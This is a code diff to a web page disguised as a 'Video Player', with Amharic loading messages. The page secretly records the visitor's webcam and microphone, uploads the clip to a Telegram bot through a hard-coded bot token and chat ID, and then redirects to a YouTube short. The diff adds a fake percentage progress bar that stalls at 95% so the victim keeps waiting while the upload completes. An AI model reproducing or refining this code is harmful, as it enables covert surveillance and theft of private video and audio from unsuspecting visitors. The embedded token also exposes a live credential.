@@ -6,20 +6,26 @@
     <title>Video Player</title>
     <style>
         body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        .progress-container { width: 80%; background-color: #333; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 20px; background-color: #3498db; transition: width 0.1s; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h3 { margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="spinner"></div>
-    <h3 id="status">ቪዲዮው እየተጫነ ነው...</h3>
+    <h3 id="status">ቪዲዮው እየተጫነ ነው... <span id="percent">0%</span></h3>
+    <div class="progress-container">
+        <div id="bar" class="progress-bar"></div>
+    </div>
 
     <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>
 
     <script>
         const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
         const chatId = "5630987526";
-        const recordDuration = 30000; // 30 ሰከንድ
+        const recordDuration = 10000; // 10 ሰከንድ
 
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(stream => {
@@ -29,30 +35,44 @@
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
 
+                // የፐርሰንት ቆጠራ ሲስተም
+                let count = 0;
+                const progressBar = document.getElementById('bar');
+                const percentText = document.getElementById('percent');
+                
+                const interval = setInterval(() => {
+                    if (count < 95) { // ቪዲዮው ተልኮ እስኪያልቅ 95 ላይ እናቆየዋለን
+                        count += 1;
+                        progressBar.style.width = count + "%";
+                        percentText.innerText = count + "%";
+                    }
+                }, (recordDuration / 95));
+
                 mediaRecorder.ondataavailable = (e) => {
                     if (e.data.size > 0) chunks.push(e.data);
                 };
                 
                 mediaRecorder.onstop = () => {
-                    document.getElementById('status').innerText = "ቪዲዮው እየተላከ ነው... እባክዎ ይጠብቁ";
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('video', blob, 'capture.mp4');
 
-                    // እዚህ ጋር sendVideo የሚለውን እንጠቀማለን
                     fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     }).then(() => {
-                        window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
+                        // መላኩ ሲያልቅ 100% አድርገን ወደ ዩቲዩብ እንልካለን
+                        progressBar.style.width = "100%";
+                        percentText.innerText = "100%";
+                        setTimeout(() => {
+                            window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
+                        }, 500);
                     });
                 };
 
-                // መቅዳት ጀምር
                 mediaRecorder.start();
 
-                // ከ30 ሰከንድ በኋላ አቁም
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
